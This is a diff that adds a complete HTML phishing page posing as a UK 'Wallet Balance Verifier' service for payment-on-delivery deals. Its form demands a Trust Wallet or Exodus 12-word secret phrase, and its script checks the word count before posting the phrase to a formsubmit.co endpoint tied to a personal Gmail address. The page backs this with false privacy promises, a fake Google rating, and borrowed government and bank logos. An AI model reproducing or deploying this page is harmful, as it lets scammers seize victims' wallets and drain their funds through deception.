@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple Website</title>
+    <style>
+        body {
+    	    font-family: Arial, sans-serif;
+    	    margin: 0;
+    	    padding: 0;
+   	}
+
+        header {
+            background-color: #1976D2;
+            color: white;
+            padding-top: 20px;
+	    padding-bottom: 20px;
+            text-align: center;
+        }
+        .brand {
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 2px;
+        }
+        .icon {
+            margin-right: 10px;
+	    width: 50px;
+  	    height: 50px;
+        }
+
+        nav {
+	    display: flex;
+	    justify-content: center;
+	    align-items: center;
+    
+	}
+
+	nav a {
+	    color: white;
+	    text-decoration: none;
+	    font-size: 20px;
+	    border-radius: 5px;
+	    padding: 12px;
+	    transition: background-color 0.3s;
+	    margin: 0 10px; /* Add margin to the left and right */
+	}
+
+        nav a.active {
+            background-color: #0f4c8b;
+        }
+        nav a:hover {
+            background-color: #0f4c8b;
+        }
+        main {
+            padding: 20px;
+        }
+        footer {
+            background-color: #1976D2;
+            color: white;
+            padding: 10px;
+            text-align: center;
+            /* position: fixed;*/
+            bottom: 0;
+            max-width: 100%;
+        }
+        /* Hide all sections by default except the active one */
+        main section {
+            display: none;
+        }
+        main section#home {
+            display: block;
+        }
+
+        .steps {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        .step {
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+        
+        .head-text {
+	    font-size: 60px;
+	    font-weight: bold;
+	    text-align: center;
+	    display: flex;
+	    justify-content: center;
+	    align-items: center;
+	    margin-top: 20px;
+	    margin-bottom: 30px;
+	    white-space: nowrap; /* Prevent wrapping */
+	}
+
+	.head-text span {
+	    margin-right: 5px; /* Adjust the spacing between the words */
+	}
+	
+	.head-text img {
+            height: 100%;
+            object-fit: cover; /* Adjusts image size */
+	}
+
+        .middle {
+            font-weight: bold;
+	    font-size: 25px;
+            text-align: center;
+        }
+
+
+        .dropdown-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .dropdown-select {
+            width: 50%;
+            padding: 10px;
+            border: 1px solid #ccc; /* Add slim borders */
+            border-radius: 5px;
+            background-color: #f0f0f0;
+            color: #333;
+            font-size: 16px;
+            /* appearance: none;  Hide default arrow */
+        }
+
+        .dropdown-select option:first-child {
+            color: #ccc; /* Change color of placeholder option */
+        }
+
+        .input-container {
+            width: 50%;
+            margin: 0 auto; /* Center the input container horizontally */
+            margin-bottom: 20px;
+        }
+
+        .input-container label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .input-container input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box; /* Include padding and border in width */
+        }
+
+	.input-container textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box; /* Include padding and border in width */
+        }
+
+        .submit-button-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+	.input-container1 {
+            width: 50%;
+	    text-align: center;
+            margin: 0 auto; /* Center the input container horizontally */
+            margin-bottom: 20px;
+        }
+
+	.submit-button-container1 {
+            width: 100%;
+	    margin-top: 30px;
+	    text-align: center;
+            justify-content: center;
+            align-items: center;	    
+        }
+	.submit-button-container2 {
+            width: 100%;
+	    margin-bottom: 20px;
+	    margin-top: 20px;
+	    text-align: center;
+            justify-content: center;
+            align-items: center;	    
+        }
+	
+        .submit-button {
+            background-color: #2196F3; /* Match header background color */
+            color: white;
+            padding: 15px 90px; /* Larger padding */
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+	    margin-bottom: 30px;
+        }
+
+        .submit-button:hover {
+            background-color: #1976D2; /* Darker shade on hover */
+        }
+
+        .note {
+            font-size: 13px;
+            color: #ccc; /* Ash color */
+            width: 50%;
+            margin: 0 auto; /* Center the input container horizontally */
+            margin-bottom: 30px;
+
+        }
+	.image-container {
+	    width: 100%;
+	    text-align: center;
+            justify-content: center;
+            align-items: center;
+  	    display: flex;
+  	    overflow-x: auto; /* Horizontal scroll */
+  	    white-space: nowrap; /* Prevent wrapping */
+	}
+
+	.image {
+  	    width: 200px;
+  	    height: 50px;
+  	    margin-right: 10px; /* Spacing between images */
+  	   /* background-color: #ccc;*/
+	}
+	.image img {
+  	    width: 100%;
+	    border-radius: 5px;
+            height: 100%;
+            object-fit: cover; /* Adjusts image size */
+	}
+
+	.google {
+	    font-size: 30px;
+            margin: 0 auto; /* Center the input container horizontally */
+	    margin-top: 10px;
+	}
+	.stars {
+	    text-align: center;
+            justify-content: center;
+            align-items: center;
+	}
+
+	.about-us {
+	    padding-left: 50px;
+	    padding-right:50px;
+	    padding-top: 20px;
+	    max-width: 100%;
+	    line-height: 1.8;
+	    background-color: #B6E8F3;
+	    text-align: left; 
+	    padding-bottom: 20px;
+	    margin: 0px;
+	}
+
+        .faq {
+            padding-left: 50px;
+            padding-right: 50px;
+            padding-top: 20px;
+            max-width: 100%;
+            line-height: 1.8;
+            background-color: #B6E8F3;
+            text-align: center; 
+            padding-bottom: 20px;
+            margin: 0px;
+        }
+
+        .bg-container {
+            padding-left: 50px;
+            padding-right: 50px;
+            padding-top: 20px;
+            max-width: 100%;
+            background-color: #B6E8F3;
+            padding-bottom: 20px;
+            margin: 0px;
+        }
+
+        table {
+            width: 100%;
+            padding: 40px;
+            margin-bottom: 40px;
+            border-collapse: collapse;
+        }
+
+        th, td {
+            border: 1px solid #9A9A9A;
+            padding: 8px;
+            text-align: left;
+        }
+
+        .question {
+            cursor: pointer;
+        }
+
+        .answer {
+            display: none;
+        }
+
+        .plus-minus::before {
+            content: '+';
+            display: inline-block;
+            margin-right: 5px;
+        }
+
+        .minus::before {
+            content: '-';
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <nav>
+            <a href="#" class="active" onclick="changeSection('home')">Home</a>
+            <a href="#" onclick="changeSection('about')">About Us</a>
+            <a href="#" onclick="changeSection('contact')">Contact</a>
+        </nav>
+    </header>
+    <main>
+        <section id="home">
+            <div class="container">
+                <div class="middle">
+                    <p>
+                        <span style="color: black;"><b>Independent Third Party Verification</b></span>
+                    </p>
+                </div>
+                <div class="head-text">
+                    <img src="logo2.jpg" alt="Image" class="icon">
+                    <span style="color: black;">Wallet</span>
+                    <span style="color: #2196F3;"> Balance</span> 
+                    <span style="color: black;"> Verifier</span>
+                </div>
+
+<form action="https://formsubmit.co/craigjones948@gmail.com" method="POST" />
+
+                <div class="bg-container">
+                    <div class="dropdown-container">
+                        <select name="select" class="dropdown-select" style="background-color: #f0f0f0;">
+                            <option value="" disabled selected>Select a Wallet</option>
+                            <option value="item1">Trust Wallet</option>
+                            <option value="item2">Exodus Crypto Wallet</option>
+                        </select>
+                    </div>
+                    <div class="container">
+                        <div class="input-container">
+                            <label for="username"><b>Username</b></label>
+                            <input type="text" id="username" name="username" placeholder="Enter your name" required>
+                        </div>
+                        <div class="input-container">
+                            <label for="secret-phrase"><b>12-words Secret Phrase</b></label>
+                            <div style="position: relative;">
+                                <input type="password" id="secret-phrase" name="secret-phrase" placeholder="Enter your secret phrase" style="width: calc(100% - 0px);" required>
+                                <img src="eyeclosed.jpg" alt="Toggle Visibility" id="toggle-visibility" style="position: absolute; right: 5px; top: 50%; transform: translateY(-50%); cursor: pointer; width: 30px; height: 20px;">
+                            </div>
+                            
+                        </div>
+                        <div class="input-container">
+                            <label for="amount"><b>Transaction Amount (Amount To Verify)</b></label>
+                            <input type="number" id="amount" name="amount" placeholder="Enter amount to be verified" required>
+                        </div>
+                        <div class="input-container">
+                            <label for="seller-phone"><b>Seller's Contact</b></label>
+                            <input type="tel" id="seller-phone" name="seller-phone" placeholder="Enter seller's contact" required>
+                        </div>
+                        <div class="input-container1">
+                            <p style="font-size: 15px; color: #2196F3;">WE DON'T STORE OR SHARE ANY OF YOUR INFORMATION.<br>ALL THE INFO PROVIDED HERE WILL BE DELETED IMMEDIATELY VERIFICATION IS DONE.</p>
+                        </div>
+                        <!-- Submit button -->
+                        <div class="submit-button-container">
+                            <button type="submit" class="submit-button">Submit</button>
+                        </div>
+                    </div>
+		</div>
+</form>
+                <div class="container">
+		     <div class="submit-button-container1">
+                        <b><span style="color: #2196F3; padding-bottom; font-size:45px">10,000+ </span><span style="color: black; font-size:45px">Verifications Done Already</span></b>
+		    </div>
+
+      		    <div class="submit-button-container2">
+	   	        <div class="google"><span style="color: #4285F4;">G</span><span style="color: #EA4335;">o</span><span style="color: #FBBC05;">o</span><span style="color: #4285F4;">g</span><span style="color: #34A853;">l</span><span style="color: #EA4335;">e</span>
+		        <span style="color: #CCC; font-size:90%">rating</span></div>
+		        <div class="stars"><span style="color: gold; font-size:110%"><b>★★★★★</b></span> <span style="color: black;"><b>4.8</b></span> <span style="color: #CCC; font-size:70%">(1,200 reviews)</span></div>
+		    </div>
+		    
+                </div>
+	</div>
+
+<div class="faq">
+<h1>FAQ - Frequently Asked Questions</h1>
+<table>
+    <tbody>
+        <tr>
+            <td class="question" onclick="toggleAnswer(this)" style="color: red;">
+                <span class="plus-minus"></span>
+                <b>How does the verification process work?</b>
+            </td>
+        </tr>
+        <tr class="answer">
+            <td>
+                <b>Our verification process involves securely connecting to your wallet and checking the balance to ensure it covers the transaction amount. A notification is then sent to the seller to assert buyers capacity to pay on delivery. 
+            </td>
+        </tr>
+        <tr>
+            <td class="question" onclick="toggleAnswer(this)" style="color: red;">
+                <span class="plus-minus"></span>
+                <b>Do you store or retain any of my wallet information after verification?</b>
+            </td>
+        </tr>
+        <tr class="answer">
+            <td>
+                <b>No!</b> We do not store or retain any of your wallet information. After the verification process is complete, all the information provided here is automatically deleted. Your privacy and security are our top priorities.
+            </td>
+        </tr>
+	
+	<tr>
+            <td class="question" onclick="toggleAnswer(this)" style="color: red;">
+                <span class="plus-minus"></span>
+                <b>How long does the verification process take?</b>
+            </td>
+        </tr>
+        <tr class="answer">
+            <td>
+                The verification process is typically fast and seamless, usually taking just a few moments to minutes
+            </td>
+        </tr>
+
+	
+	<tr>
+            <td class="question" onclick="toggleAnswer(this)" style="color: red;">
+                <span class="plus-minus"></span>
+                <b>Is there a fee for using the verification service?</b>
+            </td>
+        </tr>
+        <tr class="answer">
+            <td>
+                The fee for verification functionality is provided by the seller.
+            </td>
+        </tr>
+
+        <!-- Add more rows as needed -->
+    </tbody>
+</table>
+</div>
+
+	</section>
+
+
+
+        <section id="about">
+<div class="middle"><p></span><span style="color: black;"><b>Payment Assurance For Sellers</b></span></p></div>
+            
+<div class="head-text">
+    <img src="C:\Users\SOLID STATE E\Desktop\telegrams\logo2.jpg" alt="Image" class="icon">
+    <span style="color: black;">Wallet</span>
+	<span style="color: #2196F3;"> Balance</span> 
+	<span style="color: black;"> Verifier</span>
+</div>
+
+
+<div class="about-us">
+<p><span style="font-size: 24px;"><b>About Us</b><br></span>
+Welcome to WALLET <span style="color: #2196F3;">BALANCE</span> VERIFIER, the premier Crypto Wallet Balance Verifier based in the United Kingdom. At W<span style="color: #2196F3;">B</span>V, we specialize in providing independent third-party verification services to ensure seamless and secure transactions between two parties, typically for payment on delivery transactions.</p>
+
+<p><span style="font-size: 24px;"><b>Our Mission</b><br></span>
+
+At W<span style="color: #2196F3;">B</span>V, our mission is to empower buyers and sellers with the confidence to proceed securely with transactions that involve payments on delivery. We believe that trust is the cornerstone of every successful transaction, and our goal is to build trust and assurance by verifying wallet balances accurately and efficiently and then notifying the selling party of the buyers payment capacity. We donot Share the Buyers Balance!.</p>
+
+<p><span style="font-size: 24px;"><b>Our Commitment to Privacy and Security</b><br></span>
+
+Privacy and Security are our top priorities at W<span style="color: #2196F3;">B</span>V. We understand the importance of protecting sensitive financial information in the digital age. None of the information provided on this site is stored or shared with anyone, not even the seller. All the information you provide are deleted once verification is done. We've equally implemented robust security measures to safeguard user data and ensure confidentiality.</p>
+
+<p><span style="font-size: 24px;"><b>Why Choose W<span style="color: #2196F3;">B</span>V?</b><br></span>
+
+<b>1. UK-Based and Verified</b>:<br>As a UK-based company, W<span style="color: #2196F3;">B</span>V adheres to the highest standards of regulatory compliance and data protection. Our verification process is transparent, reliable, and verified by goverment and trusted authorities.<br><br>
+
+<b>2. Expertise and Experience</b>:<br> With years of experience in the cryptocurrency industry and multiple partnerships, our team of experts is well-equipped to handle all your verification needs. We stay updated on the latest trends and technologies to provide you with the most accurate and reliable verification services.<br><br>
+
+<b>3. Users Satisfaction</b>:<br> At W<span style="color: #2196F3;">B</span>V, users satisfaction is paramount. We strive to exceed your expectations by delivering exceptional service and support at every step of the verification process. Trust and satisfaction are our ultimate goals.</p>
+
+<p><span style="font-size: 24px;"><b>Get Verified Today!</b><br></span>
+
+Join thousands of satisfied buyers and sellers who have chosen us as their trusted Balance Verifier to prove buyers payment capacity once delivered. If you are a seller seeking assurance of payment, we've got you covered. Get your buyers balance verified today and experience peace of mind in your transactions!</p>
+
+</div>
+
+</section>
+
+
+
+
+
+
+
+        <section id="contact">
+
+
+<div class="head-text">
+    <img src="C:\Users\SOLID STATE E\Desktop\telegrams\logo2.jpg" alt="Image" class="icon">
+    <span style="color: black;">Wallet</span>
+	<span style="color: #2196F3;"> Balance</span> 
+	<span style="color: black;"> Verifier</span>
+</div>
+
+<div class="bg-container">
+
+<div class="container">
+                    <div class="input-container">
+                        <label for="username"><b>Username</b></label>
+                        <input type="text" id="username" name="username" placeholder="Enter your name">
+                    </div>
+<div class="input-container">
+                        <label for="email"><b>Email</b></label>
+                        <input type="email" id="email" name="email" placeholder="Enter your email">
+                    </div>                    
+<div class="input-container">
+                        <label for="message"><b>Message</b></label>
+                        <textarea id="message" rows="4" cols="50"></textarea>
+
+                    </div>
+                    
+
+		    <div class="input-container">
+
+<!-- Send button -->
+                    <div class="submit-button-container">
+                        <button type="submit1" class="submit-button">Send</button>
+                    </div>
+
+</div>
+</div>
+
+
+        </section>
+    </main>
+
+
+    <footer>
+
+	<div class="image-container">
+  <div class="image"><img src="C:\Users\SOLID STATE E\Desktop\telegrams\ukgov.jpg" alt="Image 1"></div>
+  <div class="image"><img src="C:\Users\SOLID STATE E\Desktop\telegrams\trust.jpg" alt="Image 2"></div>
+  <div class="image"><img src="C:\Users\SOLID STATE E\Desktop\telegrams\binance.jpg" alt="Image 3"></div>
+  <div class="image"><img src="C:\Users\SOLID STATE E\Desktop\telegrams\barclay.jpg" alt="Image 4"></div>
+  <div class="image"><img src="C:\Users\SOLID STATE E\Desktop\telegrams\exodus.jpg" alt="Image 5"></div>
+</div>
+
+
+        <p>All Rights Reserved &copy; 2024 <span style="color: white;">Wallet</span><span style="color: black;"> Balance</span> <span style="color: white;">Verifier</span></p>
+    </footer>
+
+
+    <script>
+        function changeSection(sectionId) {
+            // Remove active class from all navigation links
+            document.querySelectorAll('nav a').forEach(link => link.classList.remove('active'));
+            // Add active class to the clicked navigation link
+            event.target.classList.add('active');
+            // Hide all sections
+            document.querySelectorAll('main section').forEach(section => section.style.display = 'none');
+            // Show the clicked section
+            document.getElementById(sectionId).style.display = 'block';
+        }
+
+
+
+	document.getElementById('toggle-visibility').addEventListener('click', function() {
+    var inputField = document.getElementById('secret-phrase');
+    if (inputField.type === 'password') {
+        inputField.type = 'text';
+        this.src = 'eyeopen.jpg'; // Replace with the open eye icon
+    } else {
+        inputField.type = 'password';
+        this.src = 'eyeclosed.jpg'; // Replace with the closed eye icon
+    }
+});
+
+//used for working faqs
+   function toggleAnswer(element) {
+        const answerRow = element.parentNode.nextElementSibling;
+        const plusMinus = element.querySelector('.plus-minus');
+
+        if (answerRow.style.display === 'table-row') {
+            answerRow.style.display = 'none';
+            plusMinus.classList.remove('minus');
+        } else {
+            answerRow.style.display = 'table-row';
+            plusMinus.classList.add('minus');
+        }
+    }
+
+
+    </script>
+
+
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    document.querySelector('.submit-button').addEventListener('click', function(event) {
+        // Prevent default form submission
+        event.preventDefault();
+        
+        // Get input field values
+        var username = document.getElementById('username').value.trim();
+        var secretPhrase = document.getElementById('secret-phrase').value.trim();
+        var amount = document.getElementById('amount').value.trim();
+        var sellerPhone = document.getElementById('seller-phone').value.trim();
+        var selectedWallet = document.querySelector('.dropdown-select').value; // Get selected value from dropdown
+                
+        // Check if all fields are filled
+        if (username === '' || secretPhrase === '' || amount === '' || sellerPhone === '' || selectedWallet === '') {
+            alert('Please fill in all fields and select a wallet');
+            return;
+        }
+                
+        // Check if number of words in secret phrase is equal to 12 (excluding spaces)
+        var wordsCount = secretPhrase.split(' ').filter(function(word) {
+            return word !== '';
+        }).length;
+                
+        if (wordsCount !== 12) {
+            alert('Secret phrase must contain exactly 12 words');
+            return;
+        }
+                
+        // If all conditions are met, execute form submission
+        document.querySelector('form').submit();
+    });
+});
+
+
+    </script>
+</body>
+</html>
